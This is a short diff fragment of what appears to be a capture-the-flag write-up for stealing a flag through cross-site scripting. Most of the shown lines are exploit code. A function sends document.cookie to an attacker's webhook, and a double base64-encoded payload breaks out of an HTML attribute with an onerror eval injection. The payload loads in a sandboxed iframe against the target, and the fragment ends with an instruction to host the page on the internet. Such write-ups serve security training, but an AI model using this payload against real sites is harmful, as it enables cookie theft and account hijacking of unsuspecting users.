@@ -55,7 +55,7 @@ Here the step to get xss and steal the flag
             window.location = webhook + "?" + w.document.cookie
         }
     }
-'''
+
     let payload = btoa(`webhook='${location.origin}';(${waifuDomainScript})()`)
     payload = btoa(`" onerror="eval(atob('${payload}'))" x="`)
     i1.src = TARGET + '#' + payload
@@ -72,11 +72,9 @@ Here the step to get xss and steal the flag
         There is other way to bypass this, but this is the shortest way to do it.
         As example you can use csp to prevent the frame from redirecting to document.referrer.
     */
-'''
     i1.sandbox = 'allow-scripts allow-same-origin allow-popups'
     document.body.appendChild(i1)
 </script>
-
 '''
 
 2.Serve the page using a web server, make sure the server is accessible from the internet.
